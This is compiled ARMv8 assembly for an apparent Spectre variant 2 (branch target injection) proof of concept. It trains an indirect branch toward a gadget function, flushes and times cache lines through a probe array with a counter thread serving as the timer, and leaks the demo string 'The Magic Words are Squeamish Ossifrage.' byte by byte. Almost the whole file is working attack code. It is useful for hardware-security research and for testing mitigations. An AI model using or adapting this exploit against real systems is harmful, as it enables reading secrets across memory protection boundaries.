	.arch armv8-a
	.file	"source1.c"
	.global	array1
	.data
	.align	3
	.type	array1, %object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	channel,131072,8
	.comm	inc_counter_thread,8,8
	.comm	counter,8,8
	.comm	miss_min,8,8
	.global	secret
	.section	.rodata
	.align	3
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw",@progbits
	.align	3
	.type	secret, %object
	.size	secret, 8
secret:
	.xword	.LC0
	.comm	value,2,8
	.comm	score,8,8
	.local	spectre_config
	.comm	spectre_config,1032,8
	.text
	.align	2
	.global	inc_counter
	.type	inc_counter, %function
inc_counter:
	sub	sp, sp, #16
	str	x0, [sp, 8]
.L2:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	add	x1, x0, 1
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	str	x1, [x0]
#APP
// 40 "../lib/spectre.h" 1
	DMB SY
// 0 "" 2
#NO_APP
	b	.L2
	.size	inc_counter, .-inc_counter
	.align	2
	.global	update_value_score
	.type	update_value_score, %function
update_value_score:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w0, [x0, 1024]
	uxtb	w1, w0
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	strb	w1, [x0]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1024]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x1, w1
	ldr	w1, [x0, x1, lsl 2]
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	str	w1, [x0]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w0, [x0, 1028]
	uxtb	w1, w0
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	strb	w1, [x0, 1]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x1, w1
	ldr	w1, [x0, x1, lsl 2]
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	str	w1, [x0, 4]
	nop
	ret
	.size	update_value_score, .-update_value_score
	.align	2
	.global	init_results
	.type	init_results, %function
init_results:
	sub	sp, sp, #16
	str	wzr, [sp, 12]
	b	.L5
.L6:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldrsw	x1, [sp, 12]
	str	wzr, [x0, x1, lsl 2]
	ldr	w0, [sp, 12]
	add	w0, w0, 1
	str	w0, [sp, 12]
.L5:
	ldr	w0, [sp, 12]
	cmp	w0, 255
	ble	.L6
	nop
	add	sp, sp, 16
	ret
	.size	init_results, .-init_results
	.align	2
	.global	sort_results
	.type	sort_results, %function
sort_results:
	sub	sp, sp, #16
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	mov	w1, -1
	str	w1, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	str	w1, [x0, 1024]
	str	wzr, [sp, 12]
	b	.L8
.L13:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w0, [x0, 1024]
	cmp	w0, 0
	blt	.L9
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldrsw	x1, [sp, 12]
	ldr	w1, [x0, x1, lsl 2]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w2, [x0, 1024]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x2, w2
	ldr	w0, [x0, x2, lsl 2]
	cmp	w1, w0
	blt	.L10
.L9:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1024]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	str	w1, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [sp, 12]
	str	w1, [x0, 1024]
	b	.L11
.L10:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w0, [x0, 1028]
	cmp	w0, 0
	blt	.L12
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldrsw	x1, [sp, 12]
	ldr	w1, [x0, x1, lsl 2]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w2, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x2, w2
	ldr	w0, [x0, x2, lsl 2]
	cmp	w1, w0
	blt	.L11
.L12:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [sp, 12]
	str	w1, [x0, 1028]
.L11:
	ldr	w0, [sp, 12]
	add	w0, w0, 1
	str	w0, [sp, 12]
.L8:
	ldr	w0, [sp, 12]
	cmp	w0, 255
	ble	.L13
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w0, [x0, 1024]
	cmp	w0, 0
	bne	.L14
	mov	w0, 0
	b	.L15
.L14:
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1024]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x1, w1
	ldr	w1, [x0, x1, lsl 2]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w2, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x2, w2
	ldr	w0, [x0, x2, lsl 2]
	lsl	w0, w0, 1
	add	w0, w0, 5
	cmp	w1, w0
	bge	.L16
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1024]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x1, w1
	ldr	w0, [x0, x1, lsl 2]
	cmp	w0, 2
	bne	.L17
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldr	w1, [x0, 1028]
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	sxtw	x1, w1
	ldr	w0, [x0, x1, lsl 2]
	cmp	w0, 0
	bne	.L17
.L16:
	mov	w0, 1
	b	.L15
.L17:
	mov	w0, 0
.L15:
	add	sp, sp, 16
	ret
	.size	sort_results, .-sort_results
	.section	.rodata
	.align	3
.LC1:
	.string	"Success"
	.align	3
.LC2:
	.string	"Unclear"
	.align	3
.LC3:
	.string	"%s: "
	.align	3
.LC4:
	.string	"0x%02X='%c' score=%d "
	.align	3
.LC5:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.text
	.align	2
	.global	print_spectre_result
	.type	print_spectre_result, %function
print_spectre_result:
	stp	x29, x30, [sp, -16]!
	add	x29, sp, 0
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	ldr	w1, [x0]
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	ldr	w0, [x0, 4]
	lsl	w0, w0, 1
	cmp	w1, w0
	blt	.L19
	adrp	x0, .LC1
	add	x0, x0, :lo12:.LC1
	b	.L20
.L19:
	adrp	x0, .LC2
	add	x0, x0, :lo12:.LC2
.L20:
	adrp	x1, .LC3
	add	x2, x1, :lo12:.LC3
	mov	x1, x0
	mov	x0, x2
	bl	printf
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0]
	mov	w4, w0
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0]
	cmp	w0, 31
	bls	.L21
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0]
	cmp	w0, 126
	bhi	.L21
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0]
	mov	w1, w0
	b	.L22
.L21:
	mov	w1, 63
.L22:
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	ldr	w2, [x0]
	adrp	x0, .LC4
	add	x0, x0, :lo12:.LC4
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	ldr	w0, [x0, 4]
	cmp	w0, 0
	ble	.L23
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0, 1]
	mov	w4, w0
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0, 1]
	cmp	w0, 31
	bls	.L24
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0, 1]
	cmp	w0, 126
	bhi	.L24
	adrp	x0, :got:value
	ldr	x0, [x0, #:got_lo12:value]
	ldrb	w0, [x0, 1]
	mov	w1, w0
	b	.L25
.L24:
	mov	w1, 63
.L25:
	adrp	x0, :got:score
	ldr	x0, [x0, #:got_lo12:score]
	ldr	w2, [x0, 4]
	adrp	x0, .LC5
	add	x0, x0, :lo12:.LC5
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
.L23:
	mov	w0, 10
	bl	putchar
	nop
	ldp	x29, x30, [sp], 16
	ret
	.size	print_spectre_result, .-print_spectre_result
	.align	2
	.type	timed_read, %function
timed_read:
	sub	sp, sp, #32
	str	x0, [sp, 8]
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	str	x0, [sp, 24]
	ldr	x0, [sp, 8]
#APP
// 110 "../lib/spectre.h" 1
	DSB SY
LDR X5, [x0]
DSB SY

// 0 "" 2
#NO_APP
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	ldr	x0, [sp, 24]
	sub	x0, x1, x0
	add	sp, sp, 32
	ret
	.size	timed_read, .-timed_read
	.align	2
	.type	flush, %function
flush:
	sub	sp, sp, #16
	str	x0, [sp, 8]
	ldr	x0, [sp, 8]
#APP
// 123 "../lib/spectre.h" 1
	DC CIVAC, x0
// 0 "" 2
// 126 "../lib/spectre.h" 1
	DSB SY
// 0 "" 2
#NO_APP
	nop
	add	sp, sp, 16
	ret
	.size	flush, .-flush
	.align	2
	.global	read_side_channel
	.type	read_side_channel, %function
read_side_channel:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	strb	w0, [x29, 31]
	str	wzr, [x29, 32]
	b	.L30
.L32:
	ldr	w1, [x29, 32]
	mov	w0, 167
	mul	w0, w1, w0
	add	w0, w0, 13
	and	w0, w0, 255
	str	w0, [x29, 36]
	ldr	w0, [x29, 36]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	timed_read
	str	x0, [x29, 40]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	ldr	x1, [x29, 40]
	cmp	x1, x0
	bhi	.L31
	ldr	w0, [x29, 36]
	cmp	w0, 0
	cset	w0, ne
	uxtb	w1, w0
	ldrb	w2, [x29, 31]
	ldr	w0, [x29, 36]
	cmp	w2, w0
	cset	w0, ne
	uxtb	w0, w0
	and	w0, w1, w0
	uxtb	w0, w0
	cmp	w0, 0
	beq	.L31
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldrsw	x1, [x29, 36]
	ldr	w0, [x0, x1, lsl 2]
	add	w2, w0, 1
	adrp	x0, spectre_config
	add	x0, x0, :lo12:spectre_config
	ldrsw	x1, [x29, 36]
	str	w2, [x0, x1, lsl 2]
.L31:
	ldr	w0, [x29, 32]
	add	w0, w0, 1
	str	w0, [x29, 32]
.L30:
	ldr	w0, [x29, 32]
	cmp	w0, 255
	ble	.L32
	nop
	ldp	x29, x30, [sp], 48
	ret
	.size	read_side_channel, .-read_side_channel
	.align	2
	.global	flush_channels
	.type	flush_channels, %function
flush_channels:
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	str	wzr, [x29, 28]
	b	.L34
.L35:
	ldr	w0, [x29, 28]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	flush
	ldr	w0, [x29, 28]
	add	w0, w0, 1
	str	w0, [x29, 28]
.L34:
	ldr	w0, [x29, 28]
	cmp	w0, 255
	ble	.L35
	nop
	ldp	x29, x30, [sp], 32
	ret
	.size	flush_channels, .-flush_channels
	.align	2
	.global	measure_latency
	.type	measure_latency, %function
measure_latency:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	mov	x0, 1048575
	str	x0, [x29, 32]
	str	wzr, [x29, 28]
	b	.L37
.L39:
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	flush
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	timed_read
	str	x0, [x29, 40]
	ldr	x1, [x29, 40]
	ldr	x0, [x29, 32]
	cmp	x1, x0
	bcs	.L38
	ldr	x0, [x29, 40]
	str	x0, [x29, 32]
.L38:
	ldr	w0, [x29, 28]
	add	w0, w0, 1
	str	w0, [x29, 28]
.L37:
	ldr	w0, [x29, 28]
	cmp	w0, 299
	ble	.L39
	ldr	x0, [x29, 32]
	ldp	x29, x30, [sp], 48
	ret
	.size	measure_latency, .-measure_latency
	.section	.rodata
	.align	3
.LC6:
	.string	"Error creating thread\n"
	.align	3
.LC7:
	.string	"Unreliable access timing\n"
	.align	3
.LC8:
	.string	"miss_min %d\n"
	.text
	.align	2
	.global	initialize_spectre
	.type	initialize_spectre, %function
initialize_spectre:
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	str	xzr, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	xzr, [x0]
	str	xzr, [x29, 24]
	b	.L42
.L43:
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	ldr	x0, [x29, 24]
	add	x0, x1, x0
	mov	w1, 1
	strb	w1, [x0]
	ldr	x0, [x29, 24]
	add	x0, x0, 1
	str	x0, [x29, 24]
.L42:
	ldr	x1, [x29, 24]
	mov	x0, 131071
	cmp	x1, x0
	bls	.L43
	adrp	x0, :got:inc_counter
	ldr	x1, [x0, #:got_lo12:inc_counter]
	adrp	x0, :got:inc_counter_thread
	ldr	x0, [x0, #:got_lo12:inc_counter_thread]
	mov	x3, 0
	mov	x2, x1
	mov	x1, 0
	bl	pthread_create
	cmp	w0, 0
	beq	.L48
	adrp	x0, :got:stderr
	ldr	x0, [x0, #:got_lo12:stderr]
	ldr	x1, [x0]
	adrp	x0, .LC6
	add	x0, x0, :lo12:.LC6
	mov	x3, x1
	mov	x2, 22
	mov	x1, 1
	bl	fwrite
	b	.L41
.L48:
	nop
.L46:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	mov	x0, 38527
	movk	x0, 0x98, lsl 16
	cmp	x1, x0
	bls	.L46
#APP
// 185 "../lib/spectre.h" 1
	DSB SY
// 0 "" 2
#NO_APP
	bl	measure_latency
	mov	x1, x0
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	cmp	x0, 0
	bne	.L47
	adrp	x0, :got:stderr
	ldr	x0, [x0, #:got_lo12:stderr]
	ldr	x1, [x0]
	adrp	x0, .LC7
	add	x0, x0, :lo12:.LC7
	mov	x3, x1
	mov	x2, 25
	mov	x1, 1
	bl	fwrite
	mov	w0, 1
	bl	exit
.L47:
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	sub	x1, x0, #1
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	mov	w1, w0
	adrp	x0, .LC8
	add	x0, x0, :lo12:.LC8
	bl	printf
.L41:
	ldp	x29, x30, [sp], 32
	ret
	.size	initialize_spectre, .-initialize_spectre
	.comm	target,8,8
	.align	2
	.global	gadget
	.type	gadget, %function
gadget:
	sub	sp, sp, #16
	str	x0, [sp, 8]
	ldr	x0, [sp, 8]
	ldrb	w0, [x0]
	lsl	w2, w0, 9
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	sxtw	x0, w2
	ldrb	w0, [x1, x0]
	add	sp, sp, 16
	ret
	.size	gadget, .-gadget
	.align	2
	.global	safe_target
	.type	safe_target, %function
safe_target:
	mov	w0, 42
	ret
	.size	safe_target, .-safe_target
	.align	2
	.global	victim
	.type	victim, %function
victim:
	sub	sp, sp, #32
	str	x0, [sp, 8]
	str	w1, [sp, 4]
	str	wzr, [sp, 24]
#APP
// 34 "source1.c" 1
	mov x19, x30

// 0 "" 2
#NO_APP
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	ldr	x0, [x0]
#APP
// 35 "source1.c" 1
	mov x3, x0
// 0 "" 2
#NO_APP
	ldr	x0, [sp, 8]
#APP
// 38 "source1.c" 1
	mov x0, x0

// 0 "" 2
// 41 "source1.c" 1
	blr x3

// 0 "" 2
// 42 "source1.c" 1
	mov x0, x0
// 0 "" 2
#NO_APP
	str	w0, [sp, 28]
#APP
// 44 "source1.c" 1
	mov x30, x19

// 0 "" 2
#NO_APP
	ldr	w1, [sp, 28]
	ldr	w0, [sp, 24]
	and	w0, w1, w0
	add	sp, sp, 32
	ret
	.size	victim, .-victim
	.align	2
	.global	readByte
	.type	readByte, %function
readByte:
	stp	x29, x30, [sp, -64]!
	add	x29, sp, 0
	str	x0, [x29, 24]
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 56]
	mov	x1,0
	mov	w0, 36
	strb	w0, [x29, 42]
	bl	init_results
	mov	w0, 999
	str	w0, [x29, 48]
	b	.L56
.L63:
	bl	flush_channels
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	adrp	x1, :got:gadget
	ldr	x1, [x1, #:got_lo12:gadget]
	str	x1, [x0]
	mov	w0, 15
	str	w0, [x29, 52]
	b	.L57
.L58:
	add	x0, x29, 42
	mov	w1, 0
	bl	victim
	ldr	w0, [x29, 52]
	sub	w0, w0, #1
	str	w0, [x29, 52]
.L57:
	ldr	w0, [x29, 52]
	cmp	w0, 0
	bgt	.L58
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	adrp	x1, :got:safe_target
	ldr	x1, [x1, #:got_lo12:safe_target]
	str	x1, [x0]
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	bl	flush
	str	wzr, [x29, 44]
	b	.L59
.L60:
	ldr	w0, [x29, 44]
	add	w0, w0, 1
	str	w0, [x29, 44]
.L59:
	ldr	w0, [x29, 44]
	cmp	w0, 99
	ble	.L60
	mov	w1, 0
	ldr	x0, [x29, 24]
	bl	victim
	ldrb	w0, [x29, 42]
	bl	read_side_channel
	bl	sort_results
	strb	w0, [x29, 43]
	ldrb	w0, [x29, 43]
	cmp	w0, 0
	bne	.L65
	ldr	w0, [x29, 48]
	sub	w0, w0, #1
	str	w0, [x29, 48]
.L56:
	ldr	w0, [x29, 48]
	cmp	w0, 0
	bgt	.L63
	b	.L62
.L65:
	nop
.L62:
	bl	update_value_score
	nop
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x29, 56]
	ldr	x0, [x0]
	eor	x0, x1, x0
	cmp	x0, 0
	beq	.L64
	bl	__stack_chk_fail
.L64:
	ldp	x29, x30, [sp], 64
	ret
	.size	readByte, .-readByte
	.section	.rodata
	.align	3
.LC9:
	.string	"Putting '%s' in memory\n"
	.align	3
.LC10:
	.string	"Reading %d bytes starting at %p:\n"
	.align	3
.LC11:
	.string	"reading %p...\n"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x1, [x0]
	adrp	x0, .LC9
	add	x0, x0, :lo12:.LC9
	bl	printf
	bl	initialize_spectre
	mov	x0, 8
	bl	malloc
	mov	x1, x0
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	str	x1, [x0]
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x0, [x0]
	bl	strlen
	str	w0, [x29, 20]
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x0, [x0]
	str	x0, [x29, 24]
	adrp	x0, .LC10
	add	x0, x0, :lo12:.LC10
	ldr	x2, [x29, 24]
	ldr	w1, [x29, 20]
	bl	printf
	b	.L67
.L68:
	adrp	x0, .LC11
	add	x0, x0, :lo12:.LC11
	ldr	x1, [x29, 24]
	bl	printf
	ldr	x0, [x29, 24]
	add	x1, x0, 1
	str	x1, [x29, 24]
	bl	readByte
	bl	print_spectre_result
.L67:
	ldr	w0, [x29, 20]
	sub	w0, w0, #1
	str	w0, [x29, 20]
	ldr	w0, [x29, 20]
	cmp	w0, 0
	bge	.L68
	mov	w0, 10
	bl	putchar
	mov	w0, 0
	ldp	x29, x30, [sp], 32
	ret
	.size	main, .-main
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
